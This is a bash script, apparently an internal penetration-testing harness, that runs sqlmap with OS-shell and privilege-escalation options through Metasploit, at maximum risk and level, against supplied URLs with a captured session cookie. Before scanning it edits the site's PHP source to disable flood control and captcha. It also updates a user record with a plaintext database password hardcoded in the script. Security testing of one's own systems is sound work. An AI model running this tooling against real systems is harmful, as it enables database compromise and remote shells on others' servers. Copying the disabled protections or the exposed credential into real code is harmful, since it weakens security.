#!/bin/bash

CLUSTER_ROOT=/var/www/ara
METASPLOIT=$CLUSTER_ROOT/metasploit-framework
SQLMAP=$CLUSTER_ROOT/sqlmap/sqlmap.py

function _prompt_for_input()
{
	echo "Enter CLUSTER ROOT"
	read CLUSTER_ROOT
	if [[ $CLUSTER_ROOT == "" ]]; then
		CLUSTER_ROOT=/var/www/ara
	fi 

	echo "Enter METASPLOIT directory"
	read METASPLOIT
	if [[ $METASPLOIT == "" ]]; then
		METASPLOIT=$CLUSTER_ROOT/metasploit-framework
	fi

	echo "Enter SQLMAP.PY PATH"
	read SQLMAP
	if [[ $SQLMAP == "" ]]; then
		SQLMAP=$CLUSTER_ROOT/sqlmap/sqlmap.py
	fi
}
function disable_rate_limit()
{
	# ensure user has a valid account
	echo update user set status = 1 where username = "'"chernjie"'" | mysql -ufusion -pabalone5KG -hdb1 fusion
	# disable flood control
	sed -i 's:memcache.*increment.*:\0 $hits=0;:g' $CLUSTER_ROOT/web/sites/common/flood_control.php
	# disable captcha
    sed -i -r 's:(ENABLED.*)TRUE:\1FALSE:g' $CLUSTER_ROOT/web/sites/domain/captcha/captcha.php
}

function run_sqlmap()
{
	python $SQLMAP \
		-u $1 \
		--os-pwn \
		--priv-esc \
		-v 4 \
		--msf-path $METASPLOIT \
		--level=5 \
		--risk=4 \
		--dbms=mysql \
		--threads=4 \
		--technique=BEUSTQ \
		--dbms=mysql \
		--skip="sid,eid" \
		--cookie="eid=$_SESSION"
}

function generate_data_argument()
{
	get_query_list | xargs -n1 -I@ echo @=blar | xargs echo | tr ' ' '&'
}

function get_query_list()
{
	$CLUSTER_ROOT/web/bin/query_field_list.php
}

function get_session_cookie()
{
	local LOGIN_URL=$(echo $1 | sed -e "s/www/login/" -e "s/http:/https:/" | cut -d/ -f1-3)

	$CLUSTER_ROOT/web/bin/session.sh $LOGIN_URL | grep sessionId -m1 | cut -d\" -f4 | sed -e "s:/:%2F:g" -e "s:+:%2B:g"
}

function _usage()
{
	echo 'USAGE: ${0##/*/} [url..]'
	exit
}

function _error()
{
        echo $@
        _usage
}

test -f "$SQLMAP" || _error "$SQLMAP not found, go to https://github.com/sqlmapproject/sqlmap to install"
test -d "$METASPLOIT" || _error "$METASPLOIT not found, go to https://github.com/rapid7/metasploit-framework to install"
test -d "$CLUSTER_ROOT" || _error "$CLUSTER_ROOT not found"

case $1 in
	help|-h|?|--help) _usage;;
	*)
		disable_rate_limit
		test -f $1 && _URLS=$(cat $1) || _URLS=$@

		_SESSION=$(get_session_cookie $_URLS)
		test -n "$_SESSION" || exit

		for i in $_URLS
		do
			FILE=$(echo $i | cut -d/ -f4- | cut -d'?' -f1 | tr '/' '-')
			yes | run_sqlmap $i > $FILE
		done
	;;
esac
